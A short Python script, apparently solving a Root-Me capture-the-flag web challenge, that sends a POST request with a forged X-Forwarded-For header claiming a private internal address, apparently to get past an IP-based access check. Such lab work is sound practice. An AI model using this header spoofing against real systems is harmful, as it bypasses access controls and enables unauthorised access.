import requests

url = 'http://challenge01.root-me.org/web-serveur/ch68/'
headers = {'X-Forwarded-For': '192.168.0.1'}

r = requests.post(url, headers=headers)

print(r.text)
